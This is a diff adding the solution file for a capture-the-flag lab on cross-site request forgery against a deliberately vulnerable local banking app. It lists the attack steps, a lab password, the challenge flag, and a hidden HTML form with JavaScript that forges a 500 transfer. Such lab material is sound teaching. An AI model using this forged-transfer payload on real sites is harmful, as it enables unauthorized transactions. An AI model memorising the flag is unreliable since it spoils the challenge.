@@ -1,0 +1,40 @@
+# CSRF - Solution
+
+## Attack Steps
+1. Start the challenge: docker compose up
+2. Open browser to http://localhost:3003
+3. Login as alice (password: password123)
+4. Keep the banking tab open
+5. Open new tab to http://localhost:3004 (attacker's site)
+6. Click "Claim Your Prize!" button on attacker's site
+7. Return to banking tab (http://localhost:3003)
+8. See the transfer in history and the flag displayed
+
+## Flag
+ARENA{CSRF_f0rc3d_tr4nsf3r}
+
+## How It Works
+
+The attacker's page contains this hidden form:
+
+```html
+<form id="csrf-form" action="http://localhost:3003/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="500">
+</form>
+```
+
+When the button is clicked, JavaScript submits this form:
+
+```javascript
+document.getElementById('csrf-form').submit();
+```
+
+The browser automatically includes alice's session cookie with the request,
+even though the request originated from a different domain (localhost:3004).
+
+The banking app can't distinguish this forged request from a legitimate one
+because there's no CSRF token validation.
+
+## Validate
+./validate.sh "ARENA{CSRF_f0rc3d_tr4nsf3r}"
